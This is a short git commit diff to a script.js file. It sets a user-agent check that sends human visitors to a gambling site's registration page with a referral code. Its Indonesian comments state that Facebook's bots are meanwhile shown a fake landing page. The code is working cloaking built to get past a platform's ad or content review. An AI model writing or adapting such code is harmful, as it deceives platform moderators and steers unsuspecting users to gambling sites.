45a43873d2ba0cc5276f16c49dd62ae03b19599d
Libra168 <officiallibra168@gmail.com>
2025-05-17 21:01:27 +0700

    Update script.js

--- script.js
+++ script.js
@@ -7,7 +7,7 @@ const isBot = botList.some(bot => userAgent.includes(bot));
 
 if (!isBot) {
   // Redirect ke situs judi jika bukan bot
-  window.location.href = "https://situsjudi-anda.com";
+  window.location.href = "https://golibra168.com/register?ref=disinihoki168";
 } else {
   // Tetap tampilkan landing page palsu untuk bot Facebook
   console.log("Bot detected. No redirect.");
